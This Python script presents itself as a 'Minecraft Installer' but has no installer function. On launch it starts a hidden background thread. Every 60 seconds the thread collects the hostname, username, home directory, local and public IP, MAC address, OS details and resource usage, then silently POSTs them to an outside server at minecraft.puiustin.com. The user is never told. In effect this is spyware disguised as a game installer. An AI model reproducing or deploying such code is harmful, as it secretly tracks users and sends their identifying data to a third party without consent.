#!/usr/bin/env python3

import time
import sys
import platform
import json
import urllib.request
import urllib.error
import socket
import os
import shutil
import getpass
import threading
import uuid

import psutil

SERVER_URL = "https://minecraft.puiustin.com/api/report"
TELEMETRY_INTERVAL = 60 

def get_public_ip():
    try:
        import urllib.request
        return urllib.request.urlopen("https://api.ipify.org", timeout=3).read().decode()
    except Exception:
        return "Unknown"


def collect_telemetry():
    """Collect as much system information as possible"""

    try:
        total, used, free = shutil.disk_usage("/")
        disk_info = {
            "total_gb": round(total / (2**30), 2),
            "used_gb": round(used / (2**30), 2),
            "free_gb": round(free / (2**30), 2),
        }
    except Exception:
        disk_info = "Unknown"

    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        local_ip = "Unknown"

    try:
        mac_address = ":".join(f"{(uuid.getnode() >> ele) & 0xff:02x}"
                                for ele in range(40, -1, -8))
    except Exception:
        mac_address = "Unknown"

    data = {
        "timestamp": time.time(),
        "hostname": socket.gethostname(),
        "current_user": getpass.getuser(),
        "home_directory": os.path.expanduser("~"),
        "current_working_directory": os.getcwd(),

        "os_system": platform.system(),
        "os_release": platform.release(),
        "os_version": platform.version(),
        "os_build": platform.platform(),
        "machine_arch": platform.machine(),
        "processor": platform.processor(),
        "endianness": sys.byteorder,


        "cpu_count_logical": os.cpu_count(),

        "python_version": sys.version,
        "python_executable": sys.executable,

        "disk": disk_info,

        "local_ip": local_ip,
        "public_ip": get_public_ip(),
        "mac_address": mac_address,

        "shell": os.environ.get("SHELL") or os.environ.get("COMSPEC"),
        "path_length": len(os.environ.get("PATH", "")),
    }

    if psutil:
        try:
            data["cpu_usage_percent"] = psutil.cpu_percent(interval=1)
            data["cpu_usage_per_core"] = psutil.cpu_percent(interval=1, percpu=True)

            vm = psutil.virtual_memory()
            data["memory"] = {
                "total_gb": round(vm.total / (2**30), 2),
                "available_gb": round(vm.available / (2**30), 2),
                "used_gb": round(vm.used / (2**30), 2),
                "percent": vm.percent,
            }

            data["boot_time"] = psutil.boot_time()

            data["disk_io"] = psutil.disk_io_counters()._asdict()
            data["network_io"] = psutil.net_io_counters()._asdict()

            if hasattr(psutil, "sensors_battery"):
                battery = psutil.sensors_battery()
                if battery:
                    data["battery"] = {
                        "percent": battery.percent,
                        "plugged_in": battery.power_plugged
                    }
        except Exception:
            data["psutil"] = "Partial failure"
    else:
        data["psutil"] = "Not installed"

    return data

def send_report(data):
    """Sends the collected data to the server."""
    try:
        json_data = json.dumps(data).encode('utf-8')
        req = urllib.request.Request(
            SERVER_URL,
            data=json_data,
            headers={'Content-Type': 'application/json'}
        )

        with urllib.request.urlopen(req, timeout=10) as response:
            if response.getcode() != 200:
                print(f" > Server returned status: {response.getcode()}")

    except urllib.error.URLError as e:
        print(f" > Connection failed: {e}")
    except Exception as e:
        print(f" > An unexpected error occurred during reporting: {e}")


def telemetry_worker():
    """Continuously collects and sends telemetry data."""
    while True:
        telemetry_data = collect_telemetry()
        send_report(telemetry_data)
        time.sleep(TELEMETRY_INTERVAL)


def main():
    print("Initializing Minecraft Installer...")

    telemetry_thread = threading.Thread(target=telemetry_worker, daemon=True)
    telemetry_thread.start()

    print("Installer is running. Add your main functions here.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down installer.")


if __name__ == "__main__":
    main()